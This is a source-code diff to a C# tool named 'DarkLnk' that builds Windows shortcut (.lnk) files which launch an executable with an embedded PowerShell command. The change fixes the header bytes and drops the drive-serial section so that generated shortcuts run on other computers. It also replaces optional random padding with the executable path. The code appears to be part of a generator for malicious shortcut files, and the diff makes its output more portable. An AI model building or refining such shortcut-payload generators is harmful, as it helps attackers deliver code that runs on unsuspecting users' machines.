@@ -304,31 +304,23 @@ namespace DarkLnk
             //Here we build the item that will dictate which executable to run and the arguments to pass it.
 
             byte[] results = new byte[] { };
-            byte[] header = new byte[] { 0x68, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 
-                0x00, 0x1C, 0x00, 0x00, 0x00, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x67, 0x00, 
-                0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0xA8, 0xAD, 0x24, 0x66, 0x10, 
-                0x00, 0x00, 0x00, 0x00 }; //This has not been RE. It generally stays the same, so we're just going to keep it static.
+
+            //This byte[] has not been RE. It generally stays the same, so we're just going to keep it static.
+            //UPDATE: We changed the lengths and removed the Drive Serial section as it prevented LNK files
+            //from working on different computers.
+            byte[] header = new byte[] { 0x64, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 
+                0x00, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x67, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x03, 0x00, 
+                0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00 }; 
 
             byte[] pathUtf8 = Encoding.UTF8.GetBytes(_realExecPath);
             byte[] padding1 = new byte[] {0x00, 0x00};
 
-            byte[] padding2 = { }; //Padding 2 may not exceed 520 bytes and it must be even in length.
-            if (_randomPadding)
-            {
-                padding2 = GenerateRandomBinaryData(_r.Next(1, 260)*2, true, _r.Next(2, 32));
-            }
-            else if (_nullPadding)
-            {
-                padding2 = GenerateNullPadding(_r.Next(1, 260)*2);
-            }
-            else
-            {
-                padding2 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
-            }
+            byte[] pathUnicode = { }; //May not exceed 520 bytes
+
+            pathUnicode = Encoding.Unicode.GetBytes(_realExecPath);
 
 
-
-            byte[] padding2Length = BitConverter.GetBytes(Convert.ToInt16(padding2.Length / 2));
+            byte[] pathUnicodeLength = BitConverter.GetBytes(Convert.ToInt16(pathUnicode.Length / 2));
             byte[] argsUnicode = Encoding.Unicode.GetBytes(_psCommand);
             byte[] argsUnicodeLength = BitConverter.GetBytes(Convert.ToInt16(argsUnicode.Length / 2));
 
@@ -336,13 +328,13 @@ namespace DarkLnk
             results = JoinBytes(results, header);
             results = JoinBytes(results, pathUtf8);
             results = JoinBytes(results, padding1);
-            results = JoinBytes(results, padding2Length);
-            results = JoinBytes(results, padding2);
+            results = JoinBytes(results, pathUnicodeLength);
+            results = JoinBytes(results, pathUnicode);
             results = JoinBytes(results, argsUnicodeLength);
             results = JoinBytes(results, argsUnicode);
 
             //fix size
-            int headersize = 45 + pathUtf8.Length + 2;
+            int headersize = 41 + pathUtf8.Length + 2;
             results = InjectBytes(results, 0, BitConverter.GetBytes(headersize));
 
 
